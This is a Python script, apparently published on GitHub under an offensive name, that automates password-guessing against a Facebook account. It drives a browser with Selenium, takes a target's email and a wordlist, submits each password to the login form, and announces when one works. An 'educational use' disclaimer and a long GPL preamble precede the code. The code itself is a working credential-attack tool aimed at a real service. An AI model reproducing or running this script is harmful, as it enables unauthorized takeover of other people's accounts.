'''
=============================================================
AlphaRapist 	: 	Automated Brute-force attack for Facebook
-------------------------------------------------------------
Author          : 	SunL0w (Dind Thibault) 
-------------------------------------------------------------
Version 	    : 	1.0
-------------------------------------------------------------
Github 	        : 	https://github.com/SunL0w/AlphaRapist
============================================================= 

/!\ Disclaimer : 
This script is for educational use. 
I am not responsible if it is used to commit illegal actions.

-------------------------------------------------------------

                   GNU GENERAL PUBLIC LICENSE
                    Version 3, 29 June 2007

    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
    Everyone is permitted to copy and distribute verbatim copies
    of this license document, but changing it is not allowed.

                         Preamble

    The GNU General Public License is a free, copyleft license for
    software and other kinds of works.

    The licenses for most software and other practical works are designed
    to take away your freedom to share and change the works.  By contrast,
    the GNU General Public License is intended to guarantee your freedom to
    share and change all versions of a program--to make sure it remains free
    software for all its users.  We, the Free Software Foundation, use the
    GNU General Public License for most of our software; it applies also to
    any other work released this way by its authors.  You can apply it to
    your programs, too.

    When we speak of free software, we are referring to freedom, not
    price.  Our General Public Licenses are designed to make sure that you
    have the freedom to distribute copies of free software (and charge for
    them if you wish), that you receive source code or can get it if you
    want it, that you can change the software or use pieces of it in new
    free programs, and that you know you can do these things.

    To protect your rights, we need to prevent others from denying you
    these rights or asking you to surrender the rights.  Therefore, you have
    certain responsibilities if you distribute copies of the software, or if
    you modify it: responsibilities to respect the freedom of others.

    For example, if you distribute copies of such a program, whether
    gratis or for a fee, you must pass on to the recipients the same
    freedoms that you received.  You must make sure that they, too, receive
    or can get the source code.  And you must show them these terms so they
    know their rights.

    Developers that use the GNU GPL protect your rights with two steps:
    (1) assert copyright on the software, and (2) offer you this License
    giving you legal permission to copy, distribute and/or modify it.

    For the developers' and authors' protection, the GPL clearly explains
    that there is no warranty for this free software.  For both users' and
    authors' sake, the GPL requires that modified versions be marked as
    changed, so that their problems will not be attributed erroneously to
    authors of previous versions.

    Some devices are designed to deny users access to install or run
    modified versions of the software inside them, although the manufacturer
    can do so.  This is fundamentally incompatible with the aim of
    protecting users' freedom to change the software.  The systematic
    pattern of such abuse occurs in the area of products for individuals to
    use, which is precisely where it is most unacceptable.  Therefore, we
    have designed this version of the GPL to prohibit the practice for those
    products.  If such problems arise substantially in other domains, we
    stand ready to extend this provision to those domains in future versions
    of the GPL, as needed to protect the freedom of users.

    Finally, every program is threatened constantly by software patents.
    States should not allow patents to restrict development and use of
    software on general-purpose computers, but in those that do, we wish to
    avoid the special danger that patents applied to a free program could
    make it effectively proprietary.  To prevent this, the GPL assures that
    patents cannot be used to render the program non-free.

    The precise terms and conditions for copying, distribution and
    modification follow.

      Copyright © 2023  Dind Thibault (https://github.com/SunL0w)

-------------------------------------------------------------
'''

import os
import subprocess
import selenium
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from time import sleep

if selenium.__version__ < "4.0":
    print("[ERROR]: Selenium version is too old. Please update Selenium to version 4.0 or higher.")
    sys.exit()

# Version of the script
version = "1.0"

# Function to detect OS, and clear the console
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to print the script banner
def print_banner():
    clear_console()
    # Get the width of the terminal window
    width = int(subprocess.check_output(['tput', 'cols']))

    # Calculate the number of spaces to add to the left of the text to center it
    spaces = (width - len("[AlphaRapist]")) // 2

    # Print a line of "=" that is as wide as the terminal window
    print("="*width)
    # Print the centered text
    print(" " * spaces + "[AlphaRapist]")
    print("-"*width)
    print(f"The current version is: {version}")
    print("Coded by SunL0w")
    print("="*width)
    print()

print_banner()
target=input("Enter the target's email: ")
PASSWORD_FILE=input("Enter the full path of the password file: ")

print_banner()
print("Choose your browser:")
print("1. Chrome")
print("2. Firefox")
print("3. Safari")

while True:
    try:
        UserBrowser = int(input("Enter the number of your choice: "))
        if UserBrowser == 1:
            print_banner()
            print("[i] Selected browser: Chrome")
            browser = webdriver.Chrome()
            break
        elif UserBrowser == 2:
            print_banner()
            print("[i] Selected browser: Firefox")
            browser = webdriver.Firefox() 
            break
        elif UserBrowser == 3:
            print_banner()
            print("[i] Selected browser: Safari")
            browser = webdriver.Safari()
            break
        else:
            raise ValueError
    except ValueError:
        print("[ERROR]: Incorrect settings. Please try again.")
        print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
        print()

print("[+] Opening the browser to Facebook...")
browser.get('https://www.facebook.com')
print("[SUCCESS] Browser Opened")
print()
sleep(5)
# Button : Only allow essential cookies

print("[INITIALIZATION OF ATTACK]")
print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
print()
#logged_url = "https://www.facebook.com/login.php"            <--[Depreciated]

# Open the file in read mode, read the data and return it as a string
# split("\n") : splits the resulting string using the newline character 
# as separator. This returns a list containing each line of the file as an element. 
password_data = open(PASSWORD_FILE, 'r').read().split("\n")
print("[i] Password file selected: ", PASSWORD_FILE)
print(f"[i] TARGET: {target}")
print()
input("[PRESS ENTER TO CONTINUE]")

print_banner()
print("[ATTACKING THE TARGET]")
print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
print()

written_email = "0"

def account_rape(target, index, password):
    # Getting current URL
    #actual_url = dbrowser.current_url                          <--[Depreciated]
    # Check if the URL matches with a successful login          
    #pswd_found = True if actual_url == logged_url else False   <--[Depreciated]
    global written_email

    # Function get the title of de web page
    def check_title(browser):
        get_title = browser.title
        return get_title
    get_title = check_title(browser)

    if written_email == "0":
        # Enter the ID
        username_box = browser.find_element(By.ID, "email")
        username_box.send_keys(target)
        sleep(1)
        written_email = "1"

        # Enter the password
        password_box = browser.find_element(By.ID, "pass")
        password_box.send_keys(password)
        sleep(1)

        # Clic Login
        # The first thing to do is to look for the ID of the "login" button in 
        # the code of the page, because the end of this ID changes every time, it starts with : u_0_5_
        login_id = browser.find_element(By.CSS_SELECTOR, "[id^='u_0_5_']")
        login_box = browser.find_element(By.ID, login_id.get_attribute("id"))
        login_box.click()
        sleep(5)
    else:
        # Enter the password
        password_box = browser.find_element(By.ID, "pass")
        password_box.send_keys(password)
        sleep(1)

        # Clic Login
        login_box = browser.find_element(By.ID, "loginbutton")
        login_box.click()
        sleep(5)

    check_title(browser)
    get_title = check_title(browser)

    if any(x in get_title for x in ["connexion", "inscription", "log in", "sign in", "Log"]):
        return False
    else:
        print_banner()
        print("\033[92m" + f"[PASSWORD FOUND]: {password}" + "\033[0m")
        print()
        return True

for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        print("[+] Trying password [", index, "]: ", password)
        if account_rape(target, index, password):
            break